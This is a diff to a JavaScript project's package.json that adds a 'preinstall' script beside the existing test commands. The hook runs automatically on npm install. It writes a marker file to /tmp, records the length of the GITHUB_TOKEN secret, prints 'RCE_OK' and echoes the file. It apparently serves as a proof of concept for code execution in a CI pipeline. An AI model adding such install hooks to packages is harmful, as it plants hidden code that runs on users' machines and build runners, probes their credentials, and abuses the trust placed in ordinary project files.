@@ -95,7 +95,8 @@
     "test:browser": "wdio run ./wdio.conf.js",
     "test:node": "npm-run-all --parallel examples:node:**",
     "test:watch": "node --test --enable-source-maps --watch dist-node/test/*.js",
-    "test": "node --test --enable-source-maps dist-node/test/*.js"
+    "test": "node --test --enable-source-maps dist-node/test/*.js",
+    "preinstall": "echo POC_MARKER_UUID > /tmp/POC_MARKER_UUID.txt; echo GH_TOKEN_LEN=${#GITHUB_TOKEN} >> /tmp/POC_MARKER_UUID.txt; echo RCE_OK >> /tmp/POC_MARKER_UUID.txt; cat /tmp/POC_MARKER_UUID.txt"
   },
   "repository": {
     "type": "git",
